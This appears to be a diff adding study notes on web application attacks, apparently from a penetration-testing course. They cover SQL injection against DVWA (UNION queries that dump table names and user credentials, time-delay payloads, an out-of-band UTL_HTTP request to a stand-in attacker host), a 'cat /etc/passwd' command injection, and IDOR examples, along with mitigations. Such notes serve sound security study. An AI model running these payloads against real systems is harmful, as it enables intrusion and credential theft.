@@ -1,2 +1,202 @@
 HTTP
 
+several granular examples of business logic flaws including the following:
+
+Unverified ownership
+Authentication bypass using an alternate path or channel
+Authorization bypass through user-controlled key
+Weak password recovery mechanism for forgotten password
+Incorrect ownership assignment
+Allocation of resources without limits or throttling
+Premature release of resource during expected lifetime
+Improper enforcement of a single, unique action
+Improper enforcement of a behavioral workflow
+
+most common SQL statements (commands):
+
+SELECT: Used to obtain data from a database
+UPDATE: Used to update data in a database
+DELETE: Used to delete data from a database
+INSERT INTO: Used to insert new data into a database
+CREATE DATABASE: Used to create a new database
+ALTER DATABASE: Used to modify a database
+CREATE TABLE: Used to create a new table
+ALTER TABLE: Used to modify a table
+DROP TABLE: Used to delete a table
+CREATE INDEX: Used to create an index or a search key element
+DROP INDEX: Used to delete an index
+
+SQL statements are divided into the following categories:
+
+Data definition language (DDL) statements
+Data manipulation language (DML) statements
+Transaction control statements
+Session control statements
+System control statements
+Embedded SQL statements
+
+boolean sql:
+something' OR '1'='1#
+
+figuring out how many columns are there:
+1' ORDER BY 3 # changing the 3 value...if it runs on an error, the last working number is the solution.
+
+Checking the database management system version number:
+1' OR 1=1 UNION SELECT 1, VERSION()#
+
+Determine the database name:
+1' OR 1=1 UNION SELECT 1, DATABASE()#
+
+Retrieve table names from the database:
+1' OR 1=1 UNION SELECT 1,table_name FROM information_schema.tables WHERE table_type='base table' AND table_schema='dvwa'#
+where dvwa is the name of the database...
+
+Retrieve column names from the users table:
+1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#
+users is the tablename
+
+Retrieve the user credentials:
+1' OR 1=1 UNION SELECT user, password FROM users #
+
+
+
+SQL injection attacks can be divided into the following categories:
+
+  -  In-band SQL injection: With this type of injection, the attacker obtains the data by using the same channel that is used to inject the SQL code. 
+     This is the most basic form of an SQL injection attack, where the data is dumped directly in a web application (or web page).
+
+  -  Out-of-band SQL injection: With this type of injection, the attacker retrieves data using a different channel. For example, an email, a text, 
+     or an instant message could be sent to the attacker with the results of the query; or the attacker might be able to send the compromised data to another system.
+  -  Blind (or inferential) SQL injection: With this type of injection, the attacker does not make the application display or transfer any data; rather, the attacker 
+     is able to reconstruct the information by sending specific statements and discerning the behavior of the application and database.
+
+
+Five techniques that can be used to exploit SQL injection vulnerabilities:
+
+  -  Union operator: This is typically used when an SQL injection vulnerability allows a SELECT statement to combine two queries into a single result or a set of results.
+  -  Boolean: This is used to verify whether certain conditions are true or false.
+  -  Error-based technique: This is used to force the database to generate an error in order to enhance and refine an attack (injection).
+  -  Out-of-band technique: This is typically used to obtain records from the database by using a different channel. For example, it is possible to make an HTTP connection to send the results to a different web server or a local machine running a web service.
+  -  Time delay: It is possible to use database commands to delay answers. An attacker may use this technique when he or she doesn’t get output or error messages from the application.
+
+Figuring out the type of the SQL database:
+Checking error messages:
+
+MYSQL:
+  MySQL Error 1064: You have an error in your SQL syntax
+Microsoft SQL:
+  Microsoft SQL Native Client error %u201880040e14%u2019
+  Unclosed quotation mark after the character string
+Microsoft SQL with ASP (active server page):
+  Server Error in '/' Application
+Oracle:
+  ORA-00933: SQL command not properly ended
+PostgreSQL:
+  PSQLException: ERROR: unterminated quoted string at or near " ' " Position: 1
+  or
+  Query failed: ERROR: syntax error at or near
+  " ' " at character 52 in /www/html/buyme.php on line 69.
+
+MySQL: 'finger' + 'printing'
+SQL Server: 'finger' 'printing'
+Oracle: 'finger'||'printing'
+PostgreSQL: 'finger'||'printing'
+
+UNION Exploitation technique: 
+https://store.h4cker.org/buyme.php?id=1234' UNION SELECT 1, user_name,password,'1','1','1',1 FROM user_system_data --
+
+Out-of-band exploitation:
+When the attacker forces the database management system (DBMS) to send the results to another server. It's actually a blind sql attack, you cant see directly the results, you can only forces it so send the result
+An example:
+https://store.h4cker.org/buyme.php?id=8||UTL_HTTP.request('malicious.h4cker.org')||(SELECT user FROM DUAL)--
+
+Time-delay sql:
+https://store.h4cker.org/buyme.php?id=8 AND IF(version() like '8%', sleep(10), 'false'))--
+
+Stored procedure
+
+
+command injection:
+something;cat /etc/passwd
+
+Lightweight Directory Access Protocol (LDAP) Injection Vulnerabilities:
+
+There are two general types of LDAP injection attacks:
+
+Authentication bypass: The most basic LDAP injection attacks are launched to bypass password and credential checking.
+Information disclosure: An attacker could inject crafted LDAP packets to list all resources in an organization’s directory and perform reconnaissance.
+
+Mitigate sql injection:
+  -  using parameterized queries (prepared statements)
+  -  input checking
+  -  field validation
+  -  filtering user inputs
+  -  escaping user input
+
+authentication-based vulnerabilities in an affected system:
+
+Credential brute forcing
+Session hijacking
+Redirecting
+Exploiting default credentials
+Exploiting weak credentials
+Exploiting Kerberos
+
+Session Hijacking:
+
+web session high-level process:
+  -  pre-authentication
+  -  authentication
+  -  session management
+  -  access control
+  -  session finalization
+
+SSID variations:
+  -  PHP: PHPSESSID
+  -  J2EE: JSESSIONID
+  -  ColdFusion: CFID and CFTOKEN
+  -  ASP.NET: ASP.NET_SessionId
+
+Several ways an attacker can perform session hijacking and several ways a session token may be compromised:
+
+Predicting session tokens: This is why it is important to use non-predictable tokens, as previously discussed in this section.
+Session sniffing: This can occur through collecting packets of unencrypted web sessions.
+On-path attack (formerly known as man-in-the-middle attack): With this type of attack, the attacker sits in the path between the client and the web server. 
+In addition, a browser (or an extension or a plugin) can be compromised and used to intercept and manipulate web sessions between the user and the web server. 
+This browser-based attack was previously known as a man-in-the-browser attack.
+
+To protect against session hijacking, you should verify that the developers have:
+  -  changed the default session ID name of the web development framework to the generic name
+  -  ensured that the session ID is long enough to prevent brute-force attacks; the session ID must be at least 128 bits long.
+  -  ensured that the session ID is unique and unpredictable
+  -  used a cryptographically secure pseudorandom number generator (PRNG) for the session ID
+ 
+Kerberos Vulnerabilities
+  -  golden ticket attack
+  -  use of unconstrained Kerberos delegation
+
+Parameter pollution:
+HTTP parameter pollution (HPP) vulnerabilities can be introduced if multiple HTTP parameters have the same name. This issue may cause an application to interpret values incorrectly. 
+An attacker may take advantage of HPP vulnerabilities to bypass input validation, trigger application errors, or modify internal variable values.
+Example:
+https://store.h4cker.org/?search=cars&results=20&search=bikes
+
+Insecure Direct Object Reference Vulnerabilities
+Insecure Direct Object Reference vulnerabilities can be exploited when web applications allow direct access to objects based on user input. 
+Successful exploitation could allow attackers to bypass authorization and access resources that should be protected by the system (for example, database records, system files). 
+This type of vulnerability occurs when an application does not sanitize user input and does not perform appropriate authorization checks.
+Example:
+https://store.h4cker.org/buy?customerID=1188
+If we change 1188 maybe we get another customers information.
+https://store.h4cker.org/changepassd?user=omar
+etc.
+
+authorization-based vulnerabilities:
+  -  HTTP parameter pollution
+  -  Insecure Direct Object Reference
+
+authentication-based vulnerabilities:
+  -  Kerberos weakness
+  -  session hijacking
+  -  default credentials
+
